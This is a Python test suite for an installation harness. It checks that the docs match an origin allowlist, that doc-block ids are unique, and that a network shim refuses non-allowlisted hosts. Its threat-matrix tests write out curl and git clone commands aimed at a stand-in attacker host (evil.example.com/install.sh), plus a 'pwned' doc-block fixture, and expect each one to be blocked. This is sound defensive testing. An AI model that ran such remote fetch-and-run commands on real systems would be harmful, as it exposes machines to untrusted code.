"""AT-11 versioned-tree hygiene suite (static V1 half of scenario 3).

Framework seeded by task 1.2 (design slice 2): a pattern engine plus a scope
manifest that later repair tasks (1.4, 1.5, 1.6, 2.2, 2.4) extend in their
own work units, so the suite stays green at every unit boundary while the
guarded surface grows to the whole installation-relevant tree.

Covered here:
- allowlist <-> installation-docs equivalence, in BOTH directions
  (scripts/acceptance/allowed-origins.txt vs the scoped docs sections);
- every doc-block id referenced by the harness or any scenario file exists
  exactly once in its expected, allowlisted file;
- machine-coupling pattern scan over the seeded clean scopes;
- threat matrix "documentation-like paths": the real bash extractor refuses
  unknown ids, duplicate ids, and non-allowlisted files (nothing executed);
- threat matrix "network origin boundary": the real origin-shim refuses
  non-allowlisted hosts with BLOCKED-ORIGIN.

Pure stdlib; the bash side is exercised through subprocess so the tests prove
the shipped implementation, not a re-implementation of it.
"""

from __future__ import annotations

import fnmatch
import re
import shlex
import shutil
import subprocess
from pathlib import Path

BASH = shutil.which("bash") or "/bin/bash"

REPO_ROOT = Path(__file__).resolve().parents[2]
HARNESS = REPO_ROOT / "scripts" / "acceptance" / "clean-install.sh"
ALLOWLIST = REPO_ROOT / "scripts" / "acceptance" / "allowed-origins.txt"
SHIM = REPO_ROOT / "scripts" / "acceptance" / "origin-shim"
SCENARIOS_DIR = REPO_ROOT / "scripts" / "acceptance" / "scenarios"

# ---------------------------------------------------------------------------
# Allowlist parsing and host matching (twin of origin-shim's logic).
# ---------------------------------------------------------------------------


def parse_allowlist(text: str) -> list[tuple[str, str | None]]:
    """Return [(origin_pattern, pending_annotation_or_None)], comments stripped."""
    entries: list[tuple[str, str | None]] = []
    for raw in text.splitlines():
        line = raw.split("#", 1)[0].strip()
        if not line:
            continue
        pending = None
        comment = raw.split("#", 1)[1] if "#" in raw else ""
        m = re.search(r"pending-docs:\s*(\S.*)$", comment)
        if m:
            pending = m.group(1).strip()
        entries.append((line, pending))
    return entries


def host_allowed(host: str, entries: list[tuple[str, str | None]]) -> bool:
    return any(fnmatch.fnmatch(host, pat) for pat, _ in entries)


# ---------------------------------------------------------------------------
# Docs scope: the installation sections of the active documentation. The
# scope grows with the documentation tasks (final state at 4.3).
# ---------------------------------------------------------------------------

DOC_SCOPES: list[tuple[str, str]] = [
    ("README.md", r"^## 📦 Installation"),
    ("hosts/herdr/tts-plugin/README.md", r"^## 📦 Installation"),
]

# pip/uv invocations document the PyPI origins implicitly (default index).
IMPLIED_ORIGIN_RULES: list[tuple[re.Pattern[str], tuple[str, ...]]] = [
    (re.compile(r"\bpip install\b"), ("pypi.org", "files.pythonhosted.org")),
    (re.compile(r"\buv (?:pip|venv|run)\b"), ("pypi.org", "files.pythonhosted.org")),
]

URL_HOST_RE = re.compile(r"https?://([A-Za-z0-9.\-]+)")


def scoped_section(relpath: str, start_re: str) -> str:
    """Extract the section starting at the first heading matching start_re
    up to the next same-level (##) heading."""
    text = (REPO_ROOT / relpath).read_text(encoding="utf-8")
    start = re.compile(start_re, re.M)
    m = start.search(text)
    assert m, f"docs scope anchor {start_re!r} not found in {relpath}"
    rest = text[m.end() :]
    nxt = re.search(r"^## ", rest, re.M)
    return rest[: nxt.start()] if nxt else rest


def test_allowlist_docs_equivalence_both_directions() -> None:
    entries = parse_allowlist(ALLOWLIST.read_text(encoding="utf-8"))
    assert entries, "allowed-origins.txt parsed empty"

    sections = {rel: scoped_section(rel, anchor) for rel, anchor in DOC_SCOPES}
    all_text = "\n".join(sections.values())

    # Direction 1: every URL host cited by the scoped installation docs must
    # be allowlisted (the docs cannot widen the network policy).
    violations = []
    for rel, section in sections.items():
        for host in URL_HOST_RE.findall(section):
            if not host_allowed(host.lower(), entries):
                violations.append(f"{rel}: host '{host}' cited but not allowlisted")
    assert not violations, "docs -> allowlist violations:\n" + "\n".join(violations)

    # Direction 2: every allowlisted origin must be documented in scope —
    # either cited by a URL, implied by pip/uv, or explicitly pending with a
    # named owner (the allowlist cannot drift wider than the documentation).
    implied: set[str] = set()
    for rule, origins in IMPLIED_ORIGIN_RULES:
        if rule.search(all_text):
            implied.update(origins)
    problems = []
    for pat, pending in entries:
        documented = pat in all_text or any(
            fnmatch.fnmatch(host.lower(), pat) for host in URL_HOST_RE.findall(all_text)
        )
        if pat in implied:
            documented = True
        if not documented and pending is None:
            problems.append(f"{pat}: neither documented in scope nor pending-docs annotated")
        if pending is not None and len(pending) < 3:
            problems.append(f"{pat}: pending-docs annotation must name its owner")
    assert not problems, "allowlist -> docs violations:\n" + "\n".join(problems)


# ---------------------------------------------------------------------------
# Doc-block ids: pinned file allowlist + referenced-id uniqueness.
# ---------------------------------------------------------------------------

OPEN_FENCE_RE = re.compile(r"^\s*`{3,}\s*[a-z]*\s*id=[\"']?([A-Za-z0-9_.-]+)[\"']?\s*$")
DOC_BLOCK_CALL_RE = re.compile(r"\b(?:run_)?doc_block\s+([^\s\"']+)\s+[\"']?([A-Za-z0-9_.-]+)")


def parse_doc_block_allowlist() -> list[str]:
    text = HARNESS.read_text(encoding="utf-8")
    m = re.search(r"DOC_BLOCK_ALLOWLIST=\(([^)]*)\)", text, re.S)
    assert m, "DOC_BLOCK_ALLOWLIST not found in clean-install.sh"
    return re.findall(r'"([^"]+)"', m.group(1))


def count_block_ids(relpath: str, block_id: str) -> int:
    path = REPO_ROOT / relpath
    if not path.is_file():
        return 0
    return sum(1 for line in path.read_text(encoding="utf-8").splitlines()
               if (m := OPEN_FENCE_RE.match(line)) and m.group(1) == block_id)


def referenced_doc_blocks() -> list[tuple[str, str, str]]:
    """(where, file, id) for every doc_block/run_doc_block call site in the
    harness or the scenario files (full-line comments excluded)."""
    refs: list[tuple[str, str, str]] = []
    candidates = [HARNESS] + sorted(SCENARIOS_DIR.glob("*.sh")) if SCENARIOS_DIR.is_dir() else [HARNESS]
    for path in candidates:
        for lineno, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
            if line.lstrip().startswith("#"):
                continue
            for m in DOC_BLOCK_CALL_RE.finditer(line):
                refs.append((f"{path.relative_to(REPO_ROOT)}:{lineno}", m.group(1), m.group(2)))
    return refs


def test_doc_block_allowlist_files_exist() -> None:
    allow = parse_doc_block_allowlist()
    assert allow, "pinned doc-block file allowlist is empty"
    missing = [rel for rel in allow if not (REPO_ROOT / rel).is_file()]
    assert not missing, f"pinned allowlist references missing files: {missing}"


def test_referenced_doc_block_ids_exist_exactly_once() -> None:
    allow = parse_doc_block_allowlist()
    refs = referenced_doc_blocks()
    problems = []
    for where, rel, block_id in refs:
        if rel not in allow:
            problems.append(f"{where}: file '{rel}' is not on the pinned allowlist")
            continue
        n = count_block_ids(rel, block_id)
        if n != 1:
            problems.append(f"{where}: id '{block_id}' in '{rel}' occurs {n} times (must be exactly 1)")
    assert not problems, "doc-block reference violations:\n" + "\n".join(problems)


# ---------------------------------------------------------------------------
# Pattern engine + scope manifest (the static scan framework).
# Repair tasks extend the manifest as they clean tree areas; every scope
# listed here must be clean NOW, so the suite stays green per work unit.
# ---------------------------------------------------------------------------

MACHINE_COUPLING_PATTERNS: list[tuple[re.Pattern[str], str]] = [
    (re.compile(r"\.dotfiles"), "maintainer dotfiles path"),
    (re.compile(r"/home/linuxbrew"), "literal brew prefix"),
    (re.compile(r"tail2640fd\.ts\.net"), "personal tailnet domain"),
    (re.compile(r"Code/personal/(?:herdr-tts|herdr-brain|agent-tts)"), "maintainer clone path"),
]

SCAN_SCOPES: dict[str, str] = {
    # Task 1.2 seed: the acceptance harness itself must stay machine-clean.
    "acceptance-harness": "scripts/acceptance",
    # Task 1.3 seed: the engine source tree is already machine-clean; guard it.
    "engine-src": "engine/src",
    # Task 1.5: bootstrap derives its dev engine/ from the script's own
    # location (audit B5) — the plugin scripts stay machine-clean.
    "tts-plugin-scripts": "hosts/herdr/tts-plugin/scripts",
}

# Archived standalone repositories: no active installer/doc/test reference
# may point at them (spec: independent-installation, "No active legacy
# references"). Task 1.4 scopes the files it repaired; 1.6 extends to the
# packaging wrappers and 4.3 to the remaining docs.
LEGACY_REPO_PATTERNS: list[re.Pattern[str]] = [
    re.compile(r"chiptime/herdr-tts"),
    re.compile(r"chiptime/herdr-brain"),
]

LEGACY_FREE_FILES: list[str] = [
    # Task 1.4: installer re-anchored to the agent-tts monorepo.
    "hosts/herdr/tts-plugin/scripts/install.sh",
    "hosts/herdr/tts-plugin/README.md",
    "hosts/herdr/tts-plugin/scripts/smoke-tests.sh",
    # Task 1.6: packaging wrappers re-anchored to the monorepo. Deliberately
    # an exact file list, NOT a blanket packaging/ directory scan: the
    # out-of-scope packaging/npm/PUBLISH.md documents the scoped npm alias
    # `@chiptime/herdr-tts` as future publication guidance, which the
    # chiptime/herdr-tts pattern substring-matches — a directory scan would
    # falsely flag it. The alias is preserved, not a legacy repository URL.
    "hosts/herdr/tts-plugin/packaging/npm/package.json",
    "hosts/herdr/tts-plugin/packaging/npm/bin/herdr-tts",
    "hosts/herdr/tts-plugin/packaging/npm/README.md",
    "hosts/herdr/tts-plugin/packaging/homebrew/herdr-tts.rb",
    "hosts/herdr/tts-plugin/packaging/homebrew/README.md",
]


# A line carrying `hygiene-exempt: <reason>` is skipped by the scan — an
# explicit, greppable escape hatch for files that must contain a pattern as
# data (e.g. the scenario that defines the pattern table itself). Every use
# is reviewable in the diff; anything else fails.
EXEMPT_MARKER_RE = re.compile(r"hygiene-exempt:\s*\S+")


def scope_violations(rel_dir: str) -> list[str]:
    root = REPO_ROOT / rel_dir
    assert root.is_dir(), f"scan scope directory missing: {rel_dir}"
    found: list[str] = []
    for path in sorted(root.rglob("*")):
        if not path.is_file() or path.is_symlink():
            continue
        try:
            text = path.read_text(encoding="utf-8")
        except (UnicodeDecodeError, OSError):
            continue
        for lineno, line in enumerate(text.splitlines(), 1):
            if EXEMPT_MARKER_RE.search(line):
                continue
            for pattern, desc in MACHINE_COUPLING_PATTERNS:
                if pattern.search(line):
                    found.append(
                        f"{path.relative_to(REPO_ROOT)}:{lineno}: {desc}: {line.strip()[:100]}"
                    )
    return found


def test_scan_scopes_are_machine_clean() -> None:
    violations: list[str] = []
    for scope, rel_dir in SCAN_SCOPES.items():
        violations.extend(f"[{scope}] {v}" for v in scope_violations(rel_dir))
    assert not violations, "machine-coupling patterns found in seeded scopes:\n" + "\n".join(violations)


def test_legacy_free_files_have_no_archived_repo_references() -> None:
    violations: list[str] = []
    for rel in LEGACY_FREE_FILES:
        path = REPO_ROOT / rel
        assert path.is_file(), f"legacy-free scope lists a missing file: {rel}"
        for lineno, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
            if EXEMPT_MARKER_RE.search(line):
                continue
            for pattern in LEGACY_REPO_PATTERNS:
                if pattern.search(line):
                    violations.append(f"{rel}:{lineno}: archived-repo reference: {line.strip()[:100]}")
    assert not violations, "active legacy-repository references found:\n" + "\n".join(violations)


# ---------------------------------------------------------------------------
# Threat matrix — documentation-like paths, against the REAL bash extractor.
# ---------------------------------------------------------------------------

FIXTURE_README = (
    "# fixture\n\n"
    "```bash id=touch-me\ntouch marked.txt\n```\n\n"
    "```bash id=dup\nfirst\n```\n\n"
    "```bash id=dup\nsecond\n```\n"
)


def bash_doc_block(checkout: Path, scen_dir: Path, func: str, rel: str, block_id: str):
    script = (
        f"export HERDR_ACCEPTANCE_API=1; source {shlex.quote(str(HARNESS))}; "
        f"CHECKOUT={shlex.quote(str(checkout))}; SCEN_DIR={shlex.quote(str(scen_dir))}; "
        f"{func} {shlex.quote(rel)} {shlex.quote(block_id)}"
    )
    return subprocess.run(["bash", "-c", script], capture_output=True, text=True, cwd=checkout)


def test_doc_block_unknown_id_fails_and_executes_nothing(tmp_path: Path) -> None:
    checkout = tmp_path / "checkout"
    checkout.mkdir()
    (checkout / "README.md").write_text(FIXTURE_README, encoding="utf-8")
    scen = tmp_path / "scen"
    scen.mkdir()
    res = bash_doc_block(checkout, scen, "run_doc_block", "README.md", "no-such-id")
    assert res.returncode != 0, f"unknown id must fail (rc={res.returncode})"
    assert "no-such-id" in res.stderr
    assert not (checkout / "marked.txt").exists(), "nothing may execute for an unknown id"


def test_doc_block_known_id_executes(tmp_path: Path) -> None:
    checkout = tmp_path / "checkout"
    checkout.mkdir()
    (checkout / "README.md").write_text(FIXTURE_README, encoding="utf-8")
    scen = tmp_path / "scen"
    scen.mkdir()
    res = bash_doc_block(checkout, scen, "run_doc_block", "README.md", "touch-me")
    assert res.returncode == 0, res.stderr
    assert (checkout / "marked.txt").exists(), "positive control: allowlisted id must execute"


def test_doc_block_duplicate_id_fails(tmp_path: Path) -> None:
    checkout = tmp_path / "checkout"
    checkout.mkdir()
    (checkout / "README.md").write_text(FIXTURE_README, encoding="utf-8")
    res = bash_doc_block(checkout, tmp_path, "doc_block", "README.md", "dup")
    assert res.returncode != 0, "duplicate id must fail"
    assert "2 times" in res.stderr or "exactly once" in res.stderr


def test_doc_block_non_allowlisted_file_never_executes(tmp_path: Path) -> None:
    checkout = tmp_path / "checkout"
    checkout.mkdir()
    evil = checkout / "docs-evil.md"
    evil.write_text("```bash id=pwned\ntouch pwned.txt\n```\n", encoding="utf-8")
    scen = tmp_path / "scen"
    scen.mkdir()
    res = bash_doc_block(checkout, scen, "run_doc_block", "docs-evil.md", "pwned")
    assert res.returncode != 0, "non-allowlisted file must be refused"
    assert "not on the pinned file allowlist" in res.stderr
    assert not (checkout / "pwned.txt").exists(), "block from non-allowlisted file must never run"


# ---------------------------------------------------------------------------
# Threat matrix — network origin boundary, against the REAL shim.
# The allowlisted cases run with NO real curl/git reachable after the shim,
# so rc 31 ("real binary not found") proves the request passed the policy
# gate; the blocked cases must carry the BLOCKED-ORIGIN marker.
# ---------------------------------------------------------------------------


def shim_env(tmp_path: Path, tool: str, origins: str) -> tuple[dict[str, str], Path]:
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir(exist_ok=True)
    link = bin_dir / tool
    if not link.exists():
        link.symlink_to(SHIM)
    env = {
        "PATH": str(bin_dir),  # nothing else reachable: hermetic policy probe
        "HERDR_ALLOWED_ORIGINS": str(tmp_path / "origins.txt"),
        "HOME": str(tmp_path),
    }
    (tmp_path / "origins.txt").write_text(origins, encoding="utf-8")
    return env, link


ORIGINS_FIXTURE = "github.com\nraw.githubusercontent.com\ncdn-lfs*.huggingface.co\n"


def run_tool(env: dict[str, str], link: Path, *args: str):
    # Invoke through bash explicitly (absolute path: the restricted child
    # PATH holds nothing but the shim, so 'bash' cannot be resolved there).
    return subprocess.run([BASH, str(link), *args], capture_output=True, text=True, env=env)


def test_shim_blocks_non_allowlisted_curl_host(tmp_path: Path) -> None:
    env, link = shim_env(tmp_path, "curl", ORIGINS_FIXTURE)
    res = run_tool(env, link, "-fsSL", "https://evil.example.com/install.sh")
    assert res.returncode == 30, f"non-allowlisted host must exit 30, got {res.returncode}"
    assert "BLOCKED-ORIGIN: evil.example.com" in res.stderr


def test_shim_exact_and_glob_matching(tmp_path: Path) -> None:
    env, link = shim_env(tmp_path, "curl", ORIGINS_FIXTURE)
    # Allowlisted host passes the gate (fails later only because no real
    # curl exists on the probe PATH — that failure is the pass proof).
    ok = run_tool(env, link, "-fsSL", "https://github.com/x/y")
    assert ok.returncode == 31 and "real curl not found" in ok.stderr
    # Wildcard entry matches the LFS CDN family...
    glob_hit = run_tool(env, link, "-fsSL", "https://cdn-lfs-7.huggingface.co/m")
    assert glob_hit.returncode == 31, "cdn-lfs*.huggingface.co must match by glob"
    # ...but NOT hosts that merely contain the suffix as a substring.
    fake = run_tool(env, link, "-fsSL", "https://not-huggingface.co/m")
    assert fake.returncode == 30 and "BLOCKED-ORIGIN: not-huggingface.co" in fake.stderr


def test_shim_blocks_non_allowlisted_git_clone(tmp_path: Path) -> None:
    env, link = shim_env(tmp_path, "git", ORIGINS_FIXTURE)
    res = run_tool(env, link, "clone", "--branch", "v0.16.0", "https://evil.example.com/x.git", "dst")
    assert res.returncode == 30, f"git clone of non-allowlisted origin must exit 30, got {res.returncode}"
    assert "BLOCKED-ORIGIN: evil.example.com" in res.stderr
    # Allowlisted clone passes the gate (no real git reachable → rc 31).
    ok = run_tool(env, link, "clone", "https://github.com/chiptime/agent-tts.git", "dst")
    assert ok.returncode == 31 and "real git not found" in ok.stderr


def test_shim_resolves_scp_style_and_ports(tmp_path: Path) -> None:
    env, link = shim_env(tmp_path, "git", ORIGINS_FIXTURE)
    res = run_tool(env, link, "clone", "git@evil.example.com:owner/repo.git")
    assert res.returncode == 30 and "BLOCKED-ORIGIN: evil.example.com" in res.stderr
    port = run_tool(env, link, "clone", "https://evil.example.com:8443/x.git")
    assert port.returncode == 30 and "BLOCKED-ORIGIN: evil.example.com" in port.stderr
